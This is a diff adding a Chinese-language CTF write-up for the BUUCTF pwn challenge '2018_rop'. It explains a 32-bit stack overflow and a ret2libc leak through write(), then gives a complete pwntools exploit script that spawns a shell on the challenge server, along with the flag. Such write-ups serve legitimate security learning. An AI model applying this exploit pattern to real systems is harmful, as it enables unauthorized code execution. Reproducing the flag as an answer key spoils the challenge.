@@ -316,6 +316,68 @@ io.interactive()
 
 ------
 
+### [铁人三项(第五赛区)_2018_rop](https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop)
+
+先`file ./2018_rop`查看文件类型再`checksec --file=2018_rop`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_rop/1.png)
+
+用`IDA Pro 32bit`打开附件`2018_rop`，按`F5`反汇编源码并查看主函数，双击`be_nice_to_people()`函数查看详情并没有发现什么，
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_rop/2.png)
+
+双击`vulnerable_function()`函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x88`，`read()`函数限制了输入到`buf`变量的字节数为`0x100`，显然存在栈溢出漏洞。构造`payload`时先用`0x88`个字节占满`buf`变量，再加上`4`个字节覆盖到返回地址。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_rop/3.png)
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`write()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`write()`函数的`plt`表和`got`表地址，进行栈溢出并通过`write()`函数泄露`write()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`write()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
+
+其中`write()`函数原型如下：
+
+```c
+ssize_t write(int fd, const void*buf, size_t count);
+// write()会把参数buf所指的内存写入count个字节到参数fd所指的文件内。
+// fd:是文件描述符（write所对应的是写，即就是1）
+// buf:通常是一个字符串，需要写入的字符串
+// count：是每次写入的字节数
+```
+
+编写`Python`代码即可得到`flag{f3efd9be-b4a5-4fd3-9446-49c300eaf93c}`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 29081)
+e = ELF('./2018_rop')
+write_plt = e.plt['write']
+log.success('write_plt => %s' % hex(write_plt))
+write_got = e.got['write']
+log.success('write_got => %s' % hex(write_got))
+main_address = e.symbols['main']
+log.success('main_address => %s' % hex(main_address))
+payload = b'a'*0x88 + b'fuck' + p32(write_plt) + p32(main_address) # 栈溢出，返回地址填写write()函数在plt表中的地址，并加上main()函数地址以再次执行程序
+payload += p32(0) + p32(write_got) + p32(4) # write()函数的参数
+io.sendline(payload)
+write_address = u32(io.recv(4))
+log.success('write_address => %s' % hex(write_address))
+libc = LibcSearcher('write', write_address) # 获取libc版本, libc6-i386_2.27-3ubuntu1_amd64
+libcbase = write_address - libc.dump('write')
+log.success('libcbase_address => %s' % hex(libcbase))
+system_address = libcbase + libc.dump('system')
+log.success('system_address => %s' % hex(system_address))
+bin_sh_address = libcbase + libc.dump('str_bin_sh')
+log.success('bin_sh_address => %s' % hex(bin_sh_address))
+payload = b'a'*0x88 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_rop/4.png)
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
